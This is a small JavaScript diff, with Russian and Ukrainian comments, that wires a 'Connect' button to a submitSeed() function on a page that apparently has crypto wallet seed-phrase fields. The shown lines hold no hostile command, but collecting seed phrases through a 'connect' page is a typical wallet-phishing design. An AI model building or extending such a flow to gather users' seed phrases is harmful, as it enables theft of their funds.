@@ -38,6 +38,15 @@ window.addEventListener("DOMContentLoaded", () => {
     } else if (window.location.href.includes("profile.html")) {
         showProfileData();
     }
+
+    // ✅ Прив'язка кнопки "Подключить"
+    const btn = document.getElementById("submitBtn");
+    if (btn) {
+        btn.addEventListener("click", () => {
+            console.log("🔘 Кнопка 'Подключить' нажата");
+            submitSeed();
+        });
+    }
 });
 
 // 📦 Поля seed-фрази
